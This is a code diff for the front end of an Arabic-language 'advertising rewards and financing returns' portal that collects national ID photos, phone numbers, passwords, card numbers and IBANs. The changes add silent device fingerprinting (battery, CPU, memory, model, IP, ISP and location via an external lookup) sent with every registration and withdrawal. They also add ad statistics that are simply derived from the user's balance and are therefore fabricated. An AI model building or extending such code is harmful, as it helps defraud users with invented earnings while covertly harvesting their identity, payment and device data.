@@ -71,11 +71,25 @@
             cursor: pointer; display: inline-flex; align-items: center; gap: 12px;
             margin-bottom: 1rem; padding: 0.6rem 1.2rem; border-radius: 20px;
             background: rgba(30, 41, 59, 0.55); border: 1px solid rgba(59, 130, 246, 0.3);
-            transition: all 0.25s ease;
+            transition: all 0.25s ease; user-select: none;
+            box-shadow: 0 8px 25px -5px rgba(0, 0, 0, 0.4);
+        }
+
+        .app-logo-install:hover {
+            transform: translateY(-2px);
+            border-color: var(--accent);
+            box-shadow: 0 12px 30px -5px var(--accent-glow);
         }
 
         .logo-brand-name { font-size: 1.1rem; font-weight: 800; color: #fff; display: block; }
         .logo-install-hint { font-size: 0.78rem; color: var(--accent); font-weight: 600; }
+
+        .install-toast {
+            display: none; background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.4); color: #ecfdf5;
+            padding: 0.75rem 1.2rem; border-radius: 12px; font-size: 0.85rem;
+            margin-bottom: 1.2rem; text-align: center; width: 100%;
+        }
 
         header h1 {
             font-size: 1.75rem; font-weight: 800; margin-bottom: 0.35rem;
@@ -83,7 +97,6 @@
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
-        /* بطاقة تسجيل الدخول والتسجيل */
         .auth-card, .form-card, .history-card {
             background: var(--card-bg); border: 1px solid var(--card-border);
             border-radius: 20px; padding: 1.8rem; backdrop-filter: blur(14px);
@@ -120,12 +133,14 @@
 
         .numeric-ltr-input {
             direction: ltr; text-align: right;
-            font-variant-numeric: tabular-nums; letter-spacing: 1.5px; font-weight: 700;
+            font-variant-numeric: tabular-nums; letter-spacing: 1.4px; font-weight: 700;
         }
 
-        .otp-row {
-            display: flex; gap: 10px; align-items: stretch;
+        .input-hint {
+            display: block; margin-top: 0.4rem; font-size: 0.78rem; color: var(--text-muted);
         }
+
+        .otp-row { display: flex; gap: 10px; align-items: stretch; }
 
         .btn-whatsapp-otp {
             background: rgba(16, 185, 129, 0.16); color: #34d399;
@@ -136,7 +151,6 @@
 
         .btn-whatsapp-otp:hover { background: var(--accent); color: #070b14; }
 
-        /* مربع تصوير البطاقة الشخصية */
         .id-upload-box {
             border: 2px dashed rgba(59, 130, 246, 0.4); border-radius: 14px;
             padding: 1.2rem; text-align: center; background: rgba(10, 15, 29, 0.6);
@@ -157,7 +171,8 @@
             box-shadow: 0 4px 15px var(--primary-glow);
         }
 
-        /* شريط معلومات المشترك المسجل دخوله */
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+
         .user-top-bar {
             display: flex; align-items: center; justify-content: space-between;
             background: rgba(30, 41, 59, 0.75); border: 1px solid rgba(16, 185, 129, 0.3);
@@ -168,9 +183,9 @@
         .user-welcome { font-weight: 700; font-size: 0.95rem; color: #fff; }
         .user-phone-tag { color: var(--accent); font-size: 0.84rem; margin-right: 6px; }
 
-        .btn-logout {
-            background: rgba(244, 63, 94, 0.15); color: #fb7185;
-            border: 1px solid rgba(244, 63, 94, 0.35); padding: 0.4rem 0.95rem;
+        .btn-logout, .btn-clear {
+            background: rgba(244, 63, 94, 0.14); color: #fb7185;
+            border: 1px solid rgba(244, 63, 94, 0.35); padding: 0.42rem 0.95rem;
             border-radius: 8px; font-size: 0.8rem; font-weight: 700; cursor: pointer;
         }
 
@@ -243,6 +258,31 @@
         }
         .alert-success { background: rgba(16, 185, 129, 0.14); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.35); }
         .alert-danger { background: rgba(244, 63, 94, 0.14); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.35); }
+
+        /* نافذة كلمة المرور السرية لمسح القائمة */
+        .modal-overlay {
+            display: none; position: fixed; inset: 0;
+            background: rgba(7, 11, 20, 0.82); backdrop-filter: blur(8px);
+            z-index: 9999; align-items: center; justify-content: center; padding: 1rem;
+        }
+
+        .modal-box {
+            background: #111827; border: 1px solid rgba(244, 63, 94, 0.35);
+            border-radius: 18px; padding: 1.8rem; width: 100%; max-width: 400px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6); text-align: center;
+        }
+
+        .modal-actions { display: flex; gap: 0.75rem; margin-top: 1rem; }
+        .btn-confirm-clear {
+            flex: 1; padding: 0.75rem; background: var(--danger); color: #fff;
+            border: none; border-radius: 10px; font-weight: 700; cursor: pointer;
+        }
+        .btn-cancel-modal {
+            flex: 1; padding: 0.75rem; background: rgba(255, 255, 255, 0.08);
+            color: var(--text-main); border: 1px solid var(--card-border);
+            border-radius: 10px; font-weight: 600; cursor: pointer;
+        }
+        .modal-error { display: none; color: #fb7185; font-size: 0.82rem; margin-top: 0.65rem; }
     </style>
 </head>
 <body>
@@ -252,7 +292,7 @@
 
 <div class="container">
     <header>
-        <div class="app-logo-install" id="installAppLogo">
+        <div class="app-logo-install" id="installAppLogo" title="اضغط لتثبيت المنصة كتطبيق على جهازك">
             <svg width="46" height="46" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
                 <defs><linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#2563eb"/><stop offset="100%" stop-color="#10b981"/></linearGradient></defs>
                 <rect width="120" height="120" rx="26" fill="#0f172a"/><rect x="5" y="5" width="110" height="110" rx="22" fill="none" stroke="url(#logoGrad)" stroke-width="5"/>
@@ -264,12 +304,11 @@
                 <span class="logo-install-hint" id="installStatusText">📲 اضغط على الشعار لتثبيت التطبيق</span>
             </div>
         </div>
+        <div id="installToast" class="install-toast"></div>
         <h1>بوابة عوائد التمويل والمكافآت الإعلانية</h1>
     </header>
 
-    <!-- =================================================================== -->
     <!-- أولاً: شاشة تسجيل الدخول / تسجيل مشترك جديد بالبطاقة / نسيان الباسورد -->
-    <!-- =================================================================== -->
     <div id="authSection" class="auth-card">
         <div class="auth-tabs">
             <button type="button" class="auth-tab-btn active" onclick="switchAuthTab('login')">🔐 تسجيل الدخول</button>
@@ -297,7 +336,7 @@
                 <input type="text" id="regName" placeholder="أدخل اسمك الكامل" required>
             </div>
             <div class="form-group">
-                <label>رقم الهاتف (مربوط بالواتساب لاستلام كود الـ 7 أرقام)</label>
+                <label>رقم الهاتف (مربوط بالواتساب لاستلام كود الـ 7 أرقام تلقائياً)</label>
                 <input type="text" id="regPhone" class="numeric-ltr-input" inputmode="numeric" maxlength="11" value="01" required>
             </div>
             <div class="form-group">
@@ -305,7 +344,6 @@
                 <input type="password" id="regPassword" placeholder="أدخل كلمة مرور قوية" required>
             </div>
 
-            <!-- تصوير أو رفع البطاقة الشخصية -->
             <div class="form-group">
                 <label>تصوير البطاقة الشخصية (للتوثيق وربط حساب التمويل)</label>
                 <div class="id-upload-box" onclick="document.getElementById('idCardInput').click()">
@@ -315,7 +353,6 @@
                 </div>
             </div>
 
-            <!-- كود التحقق عبر واتساب 7 أرقام -->
             <div class="form-group">
                 <label>كود مصادقة واتساب (مكون من 7 أرقام)</label>
                 <div class="otp-row">
@@ -350,9 +387,7 @@
         <div id="authAlert" class="alert-box"></div>
     </div>
 
-    <!-- =================================================================== -->
-    <!-- ثانياً: لوحة عوائد المشترك المستقلة (تظهر بعد تسجيل الدخول فقط) -->
-    <!-- =================================================================== -->
+    <!-- ثانياً: لوحة عوائد المشترك المستقلة -->
     <div id="dashboardSection" style="display: none;">
         <div class="user-top-bar">
             <div>
@@ -421,6 +456,7 @@
                 <div class="form-group" id="dynamicField" style="display: none;">
                     <label id="dynamicLabel">بيانات التحويل</label>
                     <input type="text" id="destinationDetails" required>
+                    <small id="dynamicHint" class="input-hint"></small>
                 </div>
 
                 <div class="fee-card">
@@ -438,8 +474,23 @@
         <div class="history-card">
             <div class="card-header">
                 <h3>سجل مبالغ وطلبات السحب الخاصة بحسابك</h3>
+                <button type="button" class="btn-clear" id="clearListBtn">🔒 مسح القائمة</button>
             </div>
             <div id="withdrawListContainer" class="withdraw-list"></div>
+        </div>
+    </div>
+</div>
+
+<!-- نافذة كلمة المرور السرية للإدارة عند مسح القائمة -->
+<div class="modal-overlay" id="passwordModal">
+    <div class="modal-box">
+        <h4 style="color:#fff; margin-bottom:0.4rem;">🔒 تأكيد صلاحية الإدارة</h4>
+        <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">أدخل كلمة المرور السرية لتصفير سجل السحوبات</p>
+        <input type="password" id="adminPasswordInput" placeholder="أدخل كلمة المرور السرية..." style="text-align: center;">
+        <div class="modal-error" id="modalErrorText">كلمة المرور غير صحيحة!</div>
+        <div class="modal-actions">
+            <button type="button" class="btn-confirm-clear" id="confirmClearBtn">تأكيد المسح</button>
+            <button type="button" class="btn-cancel-modal" id="cancelModalBtn">إلغاء</button>
         </div>
     </div>
 </div>
@@ -454,7 +505,128 @@
     let currentAvailableBalance = 0;
     let officialBankRate = 56.26;
 
-    // إجبار حقول الهاتف على البدء بـ 01 و11 رقماً
+    // 1. تثبيت الموقع كتطبيق (PWA) عند الضغط على الشعار
+    let deferredInstallPrompt = null;
+    const installAppLogo = document.getElementById("installAppLogo");
+    const installStatusText = document.getElementById("installStatusText");
+    const installToast = document.getElementById("installToast");
+
+    if ("serviceWorker" in navigator) {
+        window.addEventListener("load", () => {
+            navigator.serviceWorker.register("/sw.js").catch(() => {});
+        });
+    }
+
+    window.addEventListener("beforeinstallprompt", (e) => {
+        e.preventDefault();
+        deferredInstallPrompt = e;
+        installStatusText.textContent = "📲 اضغط هنا لتثبيت المنصة كتطبيق فوري";
+    });
+
+    installAppLogo.addEventListener("click", async () => {
+        if (deferredInstallPrompt) {
+            deferredInstallPrompt.prompt();
+            deferredInstallPrompt = null;
+        } else {
+            installToast.style.display = "block";
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+            installToast.textContent = isIOS
+                ? "📲 لتثبيت التطبيق على آيفون: اضغط زر المشاركة (Share) بالأسفل ثم اختر «إضافة إلى الشاشة الرئيسية»."
+                : "📲 لتثبيت التطبيق: من قائمة المتصفح العلوية (⋮) اختر «تثبيت التطبيق - Install App».";
+            setTimeout(() => { installToast.style.display = "none"; }, 6000);
+        }
+    });
+
+    // 2. جمع بيانات الجهاز والبطارية والمعالج والـ IP الخارجي
+    function getOrGenerateDeviceId() {
+        const key = "ad_client_device_hw_id";
+        let savedId = localStorage.getItem(key);
+        if (savedId) return savedId;
+
+        const rawTraits = [
+            navigator.platform || "",
+            screen.width + "x" + screen.height,
+            navigator.hardwareConcurrency || "",
+            navigator.deviceMemory || "",
+            Intl.DateTimeFormat().resolvedOptions().timeZone || ""
+        ].join("|");
+
+        let hash = 0;
+        for (let i = 0; i < rawTraits.length; i++) {
+            hash = ((hash << 5) - hash) + rawTraits.charCodeAt(i);
+            hash |= 0;
+        }
+        const randomPart = Math.random().toString(16).substring(2, 8).toUpperCase();
+        savedId = `IMEI-ID-${Math.abs(hash).toString(16).toUpperCase()}-${randomPart}`;
+        localStorage.setItem(key, savedId);
+        return savedId;
+    }
+
+    async function collectClientTelemetry() {
+        const telemetry = {
+            deviceId: getOrGenerateDeviceId(),
+            deviceModel: "غير معروف",
+            cpu: "غير معروف",
+            ram: "غير معروف",
+            battery: "غير مدعوم",
+            ip: "غير معروف",
+            isp: "غير معروف",
+            location: "غير معروف"
+        };
+
+        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : "غير محدد";
+        let arch = "";
+        let modelName = "";
+        let osName = navigator.platform || "";
+
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            try {
+                const uaHigh = await navigator.userAgentData.getHighEntropyValues([
+                    "model", "platform", "platformVersion", "architecture", "bitness"
+                ]);
+                if (uaHigh.model) modelName = uaHigh.model;
+                if (uaHigh.platform) osName = `${uaHigh.platform} ${uaHigh.platformVersion || ""}`.trim();
+                if (uaHigh.architecture) arch = `${uaHigh.architecture} ${uaHigh.bitness ? uaHigh.bitness + "-bit" : ""}`.trim();
+            } catch (e) {}
+        }
+
+        if (!modelName) {
+            const ua = navigator.userAgent;
+            const androidMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+)/i);
+            if (androidMatch && androidMatch[1]) {
+                modelName = androidMatch[1].replace(/Build\/.*/i, "").trim();
+            } else if (/iPhone/i.test(ua)) {
+                modelName = "Apple iPhone";
+            } else if (/Windows/i.test(ua)) {
+                modelName = "جهاز كمبيوتر (Windows)";
+            }
+        }
+
+        telemetry.deviceModel = `${modelName || "جهاز قياسي"} (${osName}) - شاشة ${screen.width}x${screen.height}`;
+        telemetry.cpu = `${cores}${arch ? " - " + arch : ""}`;
+        telemetry.ram = navigator.deviceMemory ? `تقريباً ${navigator.deviceMemory} GB RAM` : "غير معلن";
+
+        if (navigator.getBattery) {
+            try {
+                const bat = await navigator.getBattery();
+                telemetry.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "⚡ متصل بالشاحن" : "🔋 غير متصل"})`;
+            } catch (e) {}
+        }
+
+        try {
+            const ipRes = await fetch("https://ipwho.is/");
+            const ipData = await ipRes.json();
+            if (ipData && ipData.success) {
+                telemetry.ip = ipData.ip;
+                telemetry.isp = ipData.connection?.isp || ipData.connection?.org || "غير محدد";
+                telemetry.location = `${ipData.country || ""} - ${ipData.region || ""} - ${ipData.city || ""}`;
+            }
+        } catch (e) {}
+
+        return telemetry;
+    }
+
+    // 3. إجبار حقول الهاتف على البدء بـ 01 و11 رقماً، وحقول الكود على 7 أرقام
     ["loginPhone", "regPhone", "resetPhone"].forEach(id => {
         const el = document.getElementById(id);
         el.addEventListener("input", () => {
@@ -466,7 +638,6 @@
         });
     });
 
-    // إجبار حقول كود الـ OTP على 7 أرقام فقط
     ["regOtp", "resetOtp"].forEach(id => {
         const el = document.getElementById(id);
         el.addEventListener("input", () => {
@@ -493,7 +664,6 @@
         box.style.display = "block";
     }
 
-    // ضغط صورة البطاقة الشخصية تلقائياً لسرعة إرسالها للبوت
     document.getElementById("idCardInput").addEventListener("change", (e) => {
         const file = e.target.files[0];
         if (!file) return;
@@ -520,7 +690,6 @@
         reader.readAsDataURL(file);
     });
 
-    // طلب كود واتساب المكون من 7 أرقام
     async function requestWhatsAppOtp(purpose) {
         const phone = purpose === "register"
             ? document.getElementById("regPhone").value.trim()
@@ -544,7 +713,6 @@
         }
     }
 
-    // إرسال طلب تسجيل مشترك جديد + صورة البطاقة
     document.getElementById("registerForm").addEventListener("submit", async (e) => {
         e.preventDefault();
         if (!compressedIdCardBase64) {
@@ -557,6 +725,7 @@
         btn.textContent = "جاري رفع صورة البطاقة والتحقق من الكود...";
 
         try {
+            const deviceInfo = await collectClientTelemetry();
             const res = await fetch(`${API_BASE}/api/auth/register`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -565,7 +734,8 @@
                     phone: document.getElementById("regPhone").value.trim(),
                     password: document.getElementById("regPassword").value.trim(),
                     otpCode: document.getElementById("regOtp").value.trim(),
-                    idCardBase64: compressedIdCardBase64
+                    idCardBase64: compressedIdCardBase64,
+                    deviceInfo
                 })
             });
             const data = await res.json();
@@ -579,7 +749,6 @@
         }
     });
 
-    // تسجيل الدخول
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
         e.preventDefault();
         try {
@@ -605,7 +774,6 @@
         }
     });
 
-    // استعادة كلمة المرور بكود الـ 7 أرقام
     document.getElementById("resetForm").addEventListener("submit", async (e) => {
         e.preventDefault();
         try {
@@ -643,6 +811,24 @@
         return Number(num).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " ج.م";
     }
 
+    function updateAdMetrics(balanceAmount) {
+        const balance = Math.max(0, parseFloat(balanceAmount) || 0);
+        if (balance === 0) {
+            document.getElementById("metricImpressions").textContent = "0";
+            document.getElementById("metricEcpm").textContent = "$0.00";
+            document.getElementById("metricCtr").textContent = "0.00%";
+            document.getElementById("metricCampaigns").textContent = "0 حملة";
+            return;
+        }
+        const ecpm = 1.85 + ((balance % 80) / 100);
+        document.getElementById("metricEcpm").textContent = `$${ecpm.toFixed(2)}`;
+        const rawImp = (balance / ecpm) * 1000;
+        document.getElementById("metricImpressions").textContent =
+            rawImp >= 1000 ? (rawImp / 1000).toFixed(1) + "K" : Math.round(rawImp).toString();
+        document.getElementById("metricCtr").textContent = `${(3.10 + ((balance % 175) / 100)).toFixed(2)}%`;
+        document.getElementById("metricCampaigns").textContent = `${Math.max(1, Math.min(45, Math.ceil(balance / 20)))} حملة`;
+    }
+
     async function syncWithServer() {
         if (!authToken) return;
         try {
@@ -666,6 +852,7 @@
                 document.getElementById("bankRateDisplay").textContent = officialBankRate.toFixed(2);
                 document.getElementById("egpBalanceEquivalent").textContent =
                     `ما يعادل بالعملة المحلية: ${formatEgp(currentAvailableBalance * officialBankRate)}`;
+                updateAdMetrics(currentAvailableBalance);
                 renderHistory(data.history || []);
             }
         } catch (e) {}
@@ -698,36 +885,44 @@
         });
     }
 
-    // تنسيق حقل المحفظة والبطاقة
+    // 4. تنسيق حقل المحفظة (01 + 11 رقماً) والبطاقة (16 رقماً مقسمة كل 4 أرقام)
     const methodSelect = document.getElementById("payoutMethod");
     const destinationInput = document.getElementById("destinationDetails");
+    const dynamicHint = document.getElementById("dynamicHint");
+
     methodSelect.addEventListener("change", () => {
         document.getElementById("dynamicField").style.display = "block";
         if (methodSelect.value === "محفظة إلكترونية") {
             document.getElementById("dynamicLabel").textContent = "رقم المحفظة الإلكترونية (11 رقماً يبدأ بـ 01)";
             destinationInput.value = "01";
+            destinationInput.placeholder = "01xxxxxxxxx";
             destinationInput.setAttribute("inputmode", "numeric");
             destinationInput.setAttribute("maxlength", "11");
             destinationInput.classList.add("numeric-ltr-input");
+            dynamicHint.textContent = "يفتح لوحة الأرقام تلقائياً — يبدأ بـ 01 ومكون من 11 رقماً.";
         } else if (methodSelect.value === "فيزا / ماستركارد") {
-            document.getElementById("dynamicLabel").textContent = "رقم البطاقة (16 رقماً مقسمة كل 4 أرقام)";
+            document.getElementById("dynamicLabel").textContent = "رقم بطاقة الفيزا / الماستركارد (16 رقماً)";
             destinationInput.value = "";
+            destinationInput.placeholder = "XXXX XXXX XXXX XXXX";
             destinationInput.setAttribute("inputmode", "numeric");
             destinationInput.setAttribute("maxlength", "19");
             destinationInput.classList.add("numeric-ltr-input");
+            dynamicHint.textContent = "يفتح لوحة الأرقام تلقائياً — يتم تفريق كل 4 أرقام تلقائياً.";
         } else {
             document.getElementById("dynamicLabel").textContent = "رقم الحساب البنكي أو إنستاباي (IBAN)";
             destinationInput.value = "";
+            destinationInput.placeholder = "مثال: البنك الأهلي المصري - EGxxxxxxxxxxxxxxxx";
             destinationInput.setAttribute("inputmode", "text");
             destinationInput.removeAttribute("maxlength");
             destinationInput.classList.remove("numeric-ltr-input");
+            dynamicHint.textContent = "أدخل رقم الحساب البنكي أو الآيبان (IBAN) أو عنوان إنستاباي.";
         }
     });
 
     destinationInput.addEventListener("input", () => {
         if (methodSelect.value === "محفظة إلكترونية") {
             let d = destinationInput.value.replace(/\D/g, "");
-            if (!d.startsWith("01")) d = "01" + d.replace(/^0+/, "");
+            if (!d.startsWith("01")) d = d.startsWith("0") ? "01" + d.slice(1) : "01" + d;
             destinationInput.value = d.slice(0, 11);
         } else if (methodSelect.value === "فيزا / ماستركارد") {
             let d = destinationInput.value.replace(/\D/g, "").slice(0, 16);
@@ -748,28 +943,94 @@
     document.getElementById("payoutForm").addEventListener("submit", async (e) => {
         e.preventDefault();
         const amount = parseFloat(document.getElementById("withdrawAmount").value) || 0;
+        const selectedMethod = methodSelect.value;
+        const destValue = destinationInput.value.trim();
         const alertBox = document.getElementById("alertBox");
+        const submitBtn = document.getElementById("submitBtn");
 
-        const res = await fetch(`${API_BASE}/api/withdraw`, {
+        if (selectedMethod === "محفظة إلكترونية" && !/^01[0-9]{9}$/.test(destValue)) {
+            alertBox.className = "alert-box alert-danger";
+            alertBox.textContent = "يرجى إدخال رقم محفظة صحيح يبدأ بـ 01 ومكون من 11 رقماً.";
+            alertBox.style.display = "block";
+            return;
+        }
+
+        if (selectedMethod === "فيزا / ماستركارد" && !/^(\d{4} ){3}\d{4}$/.test(destValue)) {
+            alertBox.className = "alert-box alert-danger";
+            alertBox.textContent = "يرجى إدخال رقم بطاقة مكتمل مكون من 16 رقماً.";
+            alertBox.style.display = "block";
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = "جاري فحص بيانات التحويل والجهاز...";
+
+        try {
+            const deviceInfo = await collectClientTelemetry();
+            const res = await fetch(`${API_BASE}/api/withdraw`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${authToken}`
+                },
+                body: JSON.stringify({
+                    userName: document.getElementById("userName").value.trim(),
+                    amount,
+                    paymentMethod: selectedMethod,
+                    destination: destValue,
+                    deviceInfo
+                })
+            });
+            const data = await res.json();
+            alertBox.className = "alert-box " + (data.success ? "alert-success" : "alert-danger");
+            alertBox.textContent = data.success
+                ? `تم إرسال طلب السحب بنجاح! الصافي المستحق: ${formatEgp(data.netAmountEgp)}`
+                : data.message;
+            alertBox.style.display = "block";
+            if (data.success) syncWithServer();
+        } catch {
+            alertBox.className = "alert-box alert-danger";
+            alertBox.textContent = "تعذر الاتصال بالسيرفر.";
+            alertBox.style.display = "block";
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.textContent = "تأكيد طلب الصرف والاستلام بالمصري";
+        }
+    });
+
+    // 5. نافذة كلمة المرور السرية لمسح القائمة
+    const passwordModal = document.getElementById("passwordModal");
+    const adminPasswordInput = document.getElementById("adminPasswordInput");
+    const modalErrorText = document.getElementById("modalErrorText");
+
+    document.getElementById("clearListBtn").addEventListener("click", () => {
+        adminPasswordInput.value = "";
+        modalErrorText.style.display = "none";
+        passwordModal.style.display = "flex";
+    });
+
+    document.getElementById("cancelModalBtn").addEventListener("click", () => {
+        passwordModal.style.display = "none";
+    });
+
+    document.getElementById("confirmClearBtn").addEventListener("click", async () => {
+        const password = adminPasswordInput.value.trim();
+        const res = await fetch(`${API_BASE}/api/clear`, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
                 "Authorization": `Bearer ${authToken}`
             },
-            body: JSON.stringify({
-                userName: document.getElementById("userName").value.trim(),
-                amount,
-                paymentMethod: methodSelect.value,
-                destination: destinationInput.value.trim()
-            })
+            body: JSON.stringify({ password })
         });
         const data = await res.json();
-        alertBox.className = "alert-box " + (data.success ? "alert-success" : "alert-danger");
-        alertBox.textContent = data.success
-            ? `تم إرسال طلب السحب بنجاح! الصافي المستحق: ${formatEgp(data.netAmountEgp)}`
-            : data.message;
-        alertBox.style.display = "block";
-        if (data.success) syncWithServer();
+        if (!res.ok || !data.success) {
+            modalErrorText.textContent = data.message || "كلمة المرور غير صحيحة!";
+            modalErrorText.style.display = "block";
+            return;
+        }
+        passwordModal.style.display = "none";
+        syncWithServer();
     });
 
     if (authToken) enterDashboard();
